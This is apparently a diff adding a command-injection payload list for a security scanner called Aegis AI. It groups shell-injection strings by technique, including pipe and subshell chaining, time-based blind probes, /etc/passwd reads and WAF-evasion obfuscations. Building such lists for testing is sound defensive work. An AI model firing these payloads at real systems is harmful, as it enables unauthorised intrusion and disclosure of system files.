@@ -1,0 +1,70 @@
+# ──────────────────────────────────────────────────────────────────
+# Aegis AI — Command Injection Payloads
+# Lines starting with # are comments. Blank lines are ignored.
+# ──────────────────────────────────────────────────────────────────
+
+# ── Classic shell metacharacters ─────────────────────────────────
+; id
+; whoami
+| id
+| whoami
+|| id
+&& id
+`id`
+$(id)
+; ls -la
+| ls -la
+
+# ── Semicolon injection ─────────────────────────────────────────
+;cat /etc/passwd
+;uname -a
+;echo aegis_cmdi_test
+; echo aegis_cmdi_test ;
+
+# ── Pipe injection ──────────────────────────────────────────────
+| cat /etc/passwd
+| echo aegis_cmdi_test
+|echo aegis_cmdi_test|
+
+# ── AND / OR chaining ───────────────────────────────────────────
+&& echo aegis_cmdi_test
+|| echo aegis_cmdi_test
+& echo aegis_cmdi_test
+&& cat /etc/passwd
+
+# ── Backtick / subshell ─────────────────────────────────────────
+`echo aegis_cmdi_test`
+$(echo aegis_cmdi_test)
+`whoami`
+$(whoami)
+
+# ── Newline injection ───────────────────────────────────────────
+%0a id
+%0a echo aegis_cmdi_test
+%0d%0a echo aegis_cmdi_test
+
+# ── Windows variants ────────────────────────────────────────────
+& echo aegis_cmdi_test
+| echo aegis_cmdi_test
+&& echo aegis_cmdi_test
+|| echo aegis_cmdi_test
+; echo aegis_cmdi_test
+
+# ── Time-based blind ────────────────────────────────────────────
+; sleep 5
+| sleep 5
+|| sleep 5 ||
+&& sleep 5 &&
+`sleep 5`
+$(sleep 5)
+; ping -c 5 127.0.0.1
+| ping -c 5 127.0.0.1
+
+# ── WAF evasion ──────────────────────────────────────────────────
+;{echo,aegis_cmdi_test}
+;echo${IFS}aegis_cmdi_test
+;echo$IFS'aegis_cmdi_test'
+;w'h'o'am'i
+;w"h"o"am"i
+;/b??/??t /e??/p????d
+;cat$IFS/etc/passwd
